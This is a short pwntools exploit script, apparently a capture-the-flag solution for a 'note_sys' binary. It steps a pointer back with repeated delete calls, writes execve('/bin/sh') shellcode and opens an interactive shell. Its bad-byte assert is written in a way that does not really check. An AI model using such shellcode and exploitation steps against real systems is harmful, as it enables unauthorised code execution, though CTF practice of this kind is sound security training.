#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.os = "linux"
context.arch = "amd64"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    #  io = process("", env = {"LD_PRELOAD": ""})
    io = process("./note_sys")

else:
    io = remote("localhost", 9999)

#  elf = ELF("")
#  libc = ELF("")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def delete():
    io.sendlineafter("choice:\n", "2")

def new(payload):
    io.sendlineafter("choice:\n", "0")
    io.sendlineafter("characters\n", payload)

if __name__ == "__main__":
    shellcode = asm(shellcraft.execve("/bin/sh"))
    assert False in ('\x00', '\x10', '\x90' in shellcode)

    for i in xrange((0x2020c0 - 0x202028) / 8 + 1):
        delete()

    new(shellcode)

    io.interactive()
    io.close()
